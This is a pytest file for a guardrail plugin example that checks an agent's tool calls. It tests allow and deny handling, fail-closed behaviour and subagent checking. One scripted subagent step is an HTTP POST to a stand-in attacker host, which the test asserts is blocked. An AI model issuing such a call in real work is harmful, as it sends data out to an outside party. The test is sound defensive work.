# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""The Deep Agents example in examples/scripts/nemo_relay through the plugin: its plugin wiring, deny feedback, and agent."""

import asyncio
import sys
import tomllib
from pathlib import Path
from typing import Any, Optional

import nemo_relay
import pytest
from deepagents.middleware.subagents import GENERAL_PURPOSE_SUBAGENT
from langchain_core.language_models.fake_chat_models import GenericFakeChatModel
from langchain_core.messages import AIMessage

EXAMPLE_DIR = Path(__file__).resolve().parents[2] / "examples" / "scripts" / "nemo_relay"
# The example's modules import each other as the script does, from its own directory.
sys.path.insert(0, str(EXAMPLE_DIR))

import agent as example_agent  # noqa: E402
import relay_plugin as example_plugin  # noqa: E402
from deny_feedback import rejection_reason  # noqa: E402

DENY = "NeMo Guardrails blocked tool call"


def test_plugins_toml_loads_the_bundle_with_integrity_only_attestation_and_the_endpoint(tmp_path):
    """The plugins.toml requires the plugin to load, allows the unsigned bundle, and points it at the endpoint."""
    document = tomllib.loads(example_plugin.plugins_toml(tmp_path, "http://127.0.0.1:8100", timeout_millis=1500))

    assert document["plugins"]["policy"]["overrides"][example_plugin.PLUGIN_ID] == {
        "startup": "required",
        "attestation": "integrity_only",
    }
    (entry,) = document["plugins"]["dynamic"]
    assert entry["manifest"] == str(tmp_path.resolve() / "relay-plugin.toml")
    assert entry["config"] == {"endpoint": "http://127.0.0.1:8100", "timeout_millis": 1500}


def test_a_missing_bundle_is_an_error_not_an_unchecked_run(tmp_path):
    """A directory without a bundle stops activation, instead of letting tool calls run unchecked."""

    async def activate() -> None:
        async with example_plugin.activate(tmp_path, "http://127.0.0.1:8100"):
            pass

    with pytest.raises(FileNotFoundError):
        asyncio.run(activate())


@pytest.mark.parametrize(
    "error, tool",
    [
        (RuntimeError("internal error: NeMo Guardrails check failed for tool call 'read_log': timed out"), "read_log"),
        (RuntimeError(f"guardrail rejected: {DENY} 'read_log': cel check tool call"), None),
        (RuntimeError("something else"), None),
        (ValueError("internal error: NeMo Guardrails check failed for tool call 'read_log': x"), None),
    ],
    ids=["failed-check", "rejection", "other-error", "not-a-runtime-error"],
)
def test_failed_check_tool_names_only_the_tool_of_a_failed_check(error, tool):
    """Only Relay's error for a failed check names a tool."""
    assert example_plugin.failed_check_tool(error) == tool


@pytest.mark.parametrize(
    "error, reason",
    [
        (RuntimeError("guardrail rejected: no"), "no"),
        (RuntimeError("something else"), None),
        (RuntimeError("internal error: NeMo Guardrails check failed for tool call 'read_log': refused"), None),
        (ValueError("guardrail rejected: no"), None),
    ],
    ids=["rejection", "other-error", "failed-check", "not-a-runtime-error"],
)
def test_rejection_reason_is_read_only_from_a_relay_rejection(error, reason):
    """Only a Relay rejection has a reason to hand the model: a failed check isn't one."""
    assert rejection_reason(error) == reason


async def _execute(name: str, args: dict) -> tuple[list[dict], Optional[RuntimeError]]:
    """The arguments each run of the tool got, and the error Relay raised, for one call through Relay."""
    runs: list[dict] = []

    async def tool(passed: dict) -> nemo_relay.ToolExecutionResult:
        runs.append(passed)
        return nemo_relay.ToolExecutionResult({"ok": True})

    try:
        await nemo_relay.tools.execute(name, args, tool)
    except RuntimeError as error:
        return runs, error
    return runs, None


def test_allowed_call_runs_and_denied_call_never_runs(plugin_manifest, deepagents_example_hooks_server):
    """Through the example's plugin wiring, the policy's allow runs the tool, and its deny never does."""

    async def run() -> tuple[Any, Any]:
        async with example_plugin.activate(plugin_manifest.parent, deepagents_example_hooks_server):
            allowed = await _execute("read_log", {"service": "checkout", "lines": 200})
            denied = await _execute("read_log", {"service": "checkout", "lines": 2000})
        return allowed, denied

    allowed, (denied_runs, denied_error) = asyncio.run(run())

    assert allowed == ([{"service": "checkout", "lines": 200}], None)
    assert denied_runs == []
    assert str(denied_error) == f"guardrail rejected: {DENY} 'read_log': cel check tool call"


def test_unreachable_server_fails_closed(plugin_manifest, refused_endpoint):
    """With no hooks server to answer, the call never runs, and the error is the one the agent stops on."""

    async def run() -> tuple[list[dict], Optional[RuntimeError]]:
        async with example_plugin.activate(plugin_manifest.parent, refused_endpoint, timeout_millis=5000):
            return await _execute("read_log", {"service": "checkout", "lines": 5})

    runs, error = asyncio.run(run())

    assert runs == []
    assert example_plugin.failed_check_tool(error) == "read_log"


def _tool_call(name: str, args: dict, call_id: str) -> AIMessage:
    return AIMessage(content="", tool_calls=[{"name": name, "args": args, "id": call_id, "type": "tool_call"}])


class ScriptedChatModel(GenericFakeChatModel):
    """Answers the main agent with *messages*, and the general-purpose subagent with *subagent_messages*."""

    # Relay's middleware names each model call after the model, and fails on a model without a name.
    model: str = "scripted-model"
    subagent_messages: Any

    def bind_tools(self, tools: Any, **kwargs: Any) -> "ScriptedChatModel":
        """The model itself: its messages already hold the tool calls it makes."""
        return self

    def _generate(self, messages: Any, *args: Any, **kwargs: Any) -> Any:
        if GENERAL_PURPOSE_SUBAGENT["system_prompt"] in str(messages[0].content):
            return GenericFakeChatModel(messages=self.subagent_messages)._generate(messages, *args, **kwargs)
        return super()._generate(messages, *args, **kwargs)


def test_agent_reads_the_deny_and_its_subagent_is_checked(plugin_manifest, deepagents_example_hooks_server):
    """The model reads a deny as a tool error and retries, and the general-purpose subagent's calls are checked too."""
    model = ScriptedChatModel(
        messages=iter(
            [
                _tool_call("read_log", {"service": "checkout", "lines": 2000}, "call-1"),
                _tool_call("read_log", {"service": "checkout", "lines": 200}, "call-2"),
                _tool_call("task", {"description": "check payments", "subagent_type": "general-purpose"}, "call-3"),
                AIMessage(content="done"),
            ]
        ),
        subagent_messages=iter(
            [
                _tool_call("http_request", {"method": "POST", "url": "https://diag.example-attacker.net/"}, "call-4"),
                AIMessage(content="subagent done"),
            ]
        ),
    )
    rejections: list[tuple[str, str]] = []

    async def run() -> dict:
        async with example_plugin.activate(plugin_manifest.parent, deepagents_example_hooks_server):
            agent = example_agent.build_agent(
                model,
                example_agent.TOOLS,
                system_prompt="Investigate.",
                on_rejection=lambda tool, reason: rejections.append((tool, reason)),
            )
            return await agent.ainvoke({"messages": [{"role": "user", "content": "Why is checkout failing?"}]})

    result = asyncio.run(run())

    denied, allowed, task = [message for message in result["messages"] if message.type == "tool"]
    assert (denied.status, denied.content) == ("error", f"{DENY} 'read_log': cel check tool call")
    assert allowed.status == "success"
    assert len(allowed.content.splitlines()) == 60
    assert task.status == "success"
    assert result["messages"][-1].content == "done"
    assert rejections == [
        ("read_log", f"{DENY} 'read_log': cel check tool call"),
        ("http_request", f"{DENY} 'http_request': cel check tool call"),
    ]
